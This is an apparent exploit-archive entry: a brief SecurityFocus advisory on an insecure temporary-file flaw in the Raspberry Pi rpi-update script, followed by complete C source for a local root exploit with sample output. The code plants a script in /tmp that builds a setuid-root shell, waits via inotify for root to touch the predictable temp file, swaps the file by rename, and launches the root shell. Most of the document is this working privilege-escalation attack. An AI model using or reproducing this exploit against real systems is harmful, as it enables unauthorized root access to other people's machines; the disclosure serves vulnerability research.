source: http://www.securityfocus.com/bid/58292/info

rpi-update is prone to an insecure temporary file-handling vulnerability and a security-bypass vulnerability

An attacker can exploit this issue to perform symbolic-link attacks, overwriting arbitrary files in the context of the affected application, bypass certain security restrictions, and perform unauthorized actions. This may aid in further attacks. 


/*Local root exploit for rpi-update on raspberry Pi.
Vulnerability discovered by Technion,  technion@lolware.net

https://github.com/Hexxeh/rpi-update/


larry@pih0le:~$ ./rpix updateScript.sh
[*] Launching attack against "updateScript.sh"
[+] Creating evil script (/tmp/evil)
[+] Creating target file (/usr/bin/touch /tmp/updateScript.sh)
[+] Initialize inotify on /tmp/updateScript.sh
[+] Waiting for root to change perms on "updateScript.sh"
[+] Opening root shell (/tmp/sh)
# <-- Yay!


Larry W. Cashdollar
http://vapid.dhs.org
@_larry0

Greets to Vladz.
*/

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <string.h>
#include <sys/inotify.h>
#include <fcntl.h>
#include <sys/syscall.h>

/*Create a small c program to pop us a root shell*/
int create_nasty_shell(char *file) {
  char *s = "#!/bin/bash\n"
            "echo 'main(){setuid(0);execve(\"/bin/sh\",0,0);}'>/tmp/sh.c\n"
            "cc /tmp/sh.c -o /tmp/sh; chown root:root /tmp/sh\n"
            "chmod 4755 /tmp/sh;\n";

  int fd = open(file, O_CREAT|O_RDWR, S_IRWXU|S_IRWXG|S_IRWXO);
  write(fd, s, strlen(s));
  close(fd);

  return 0;
}


int main(int argc, char **argv) {
  int fd, wd;
  char buf[1], *targetpath, *cmd,
       *evilsh = "/tmp/evil", *trash = "/tmp/trash";

  if (argc < 2) {
    printf("Usage: %s <target file> \n", argv[0]);
    return 1;
  }

  printf("[*] Launching attack against \"%s\"\n", argv[1]);

  printf("[+] Creating evil script (/tmp/evil)\n");
  create_nasty_shell(evilsh);

  targetpath = malloc(sizeof(argv[1]) + 32);
  cmd = malloc(sizeof(char) * 32);
  sprintf(targetpath, "/tmp/%s", argv[1]);
  sprintf(cmd,"/usr/bin/touch %s",targetpath);
  printf("[+] Creating target file (%s)\n",cmd);
  system(cmd);

  printf("[+] Initialize inotify on %s\n",targetpath);
  fd = inotify_init();
  wd = inotify_add_watch(fd, targetpath, IN_MODIFY);

  printf("[+] Waiting for root to modify :\"%s\"\n", argv[1]);
  syscall(SYS_read, fd, buf, 1);
  syscall(SYS_rename, targetpath,  trash);
  syscall(SYS_rename, evilsh, targetpath);

  inotify_rm_watch(fd, wd);

  printf("[+] Opening root shell (/tmp/sh)\n");
  sleep(2);
  system("rm -fr /tmp/trash;/tmp/sh || echo \"[-] Failed.\"");

  return 0;
}
